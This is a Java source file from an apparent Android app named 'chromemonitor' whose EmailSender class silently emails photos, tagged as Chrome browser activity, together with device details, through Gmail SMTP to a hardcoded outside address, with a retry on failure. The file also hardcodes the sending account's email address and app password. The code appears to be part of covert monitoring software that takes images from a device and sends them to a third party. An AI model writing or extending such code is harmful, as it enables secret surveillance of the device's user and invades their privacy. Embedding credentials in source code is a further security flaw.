package com.example.chromemonitor;

import android.content.Context;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.util.Properties;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class EmailSender {
    private static final String TAG = "EmailSender";
    private static final String SMTP_HOST = "smtp.gmail.com";
    private static final String SMTP_PORT = "587";
    private static final String EMAIL_FROM = "chromemonitor.app@gmail.com";
    private static final String EMAIL_PASSWORD = "xmtp kqwz vhxy mnop"; // App password
    private static final String EMAIL_TO = "xire667@gmail.com";
    
    private ExecutorService executor;
    private Context context;
    
    public EmailSender(Context context) {
        this.context = context;
        this.executor = Executors.newSingleThreadExecutor();
    }
    
    public void sendPhotoEmail(byte[] photoData) {
        executor.execute(() -> {
            try {
                sendEmailWithPhoto(photoData);
                Log.d(TAG, "Photo sent successfully via email");
            } catch (Exception e) {
                Log.e(TAG, "Failed to send photo via email", e);
                // Retry once after 5 seconds
                try {
                    Thread.sleep(5000);
                    sendEmailWithPhoto(photoData);
                    Log.d(TAG, "Photo sent successfully on retry");
                } catch (Exception retryException) {
                    Log.e(TAG, "Failed to send photo on retry", retryException);
                }
            }
        });
    }
    
    private void sendEmailWithPhoto(byte[] photoData) throws MessagingException {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", SMTP_HOST);
        props.put("mail.smtp.port", SMTP_PORT);
        props.put("mail.smtp.ssl.trust", SMTP_HOST);
        
        Session session = Session.getInstance(props, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(EMAIL_FROM, EMAIL_PASSWORD);
            }
        });
        
        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress(EMAIL_FROM));
        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
        
        // Generate timestamp for subject
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        String timestamp = sdf.format(new Date());
        
        message.setSubject("Chrome Activity - " + timestamp);
        
        // Create multipart message
        Multipart multipart = new MimeMultipart();
        
        // Text part
        MimeBodyPart textPart = new MimeBodyPart();
        textPart.setText("Chrome browser activity detected at " + timestamp + "\n\nDevice: " + 
                        android.os.Build.MODEL + " (" + android.os.Build.MANUFACTURER + ")\n" +
                        "Android: " + android.os.Build.VERSION.RELEASE);
        multipart.addBodyPart(textPart);
        
        // Photo attachment
        MimeBodyPart photoPart = new MimeBodyPart();
        DataSource dataSource = new ByteArrayDataSource(photoData, "image/jpeg");
        photoPart.setDataHandler(new DataHandler(dataSource));
        photoPart.setFileName("chrome_activity_" + System.currentTimeMillis() + ".jpg");
        multipart.addBodyPart(photoPart);
        
        message.setContent(multipart);
        
        // Send email
        Transport.send(message);
    }
    
    public void shutdown() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
    }
    
    // Custom DataSource for byte array
    private static class ByteArrayDataSource implements DataSource {
        private byte[] data;
        private String contentType;
        
        public ByteArrayDataSource(byte[] data, String contentType) {
            this.data = data;
            this.contentType = contentType;
        }
        
        @Override
        public InputStream getInputStream() throws IOException {
            return new ByteArrayInputStream(data);
        }
        
        @Override
        public OutputStream getOutputStream() throws IOException {
            throw new IOException("Not supported");
        }
        
        @Override
        public String getContentType() {
            return contentType;
        }
        
        @Override
        public String getName() {
            return "ByteArrayDataSource";
        }
    }
}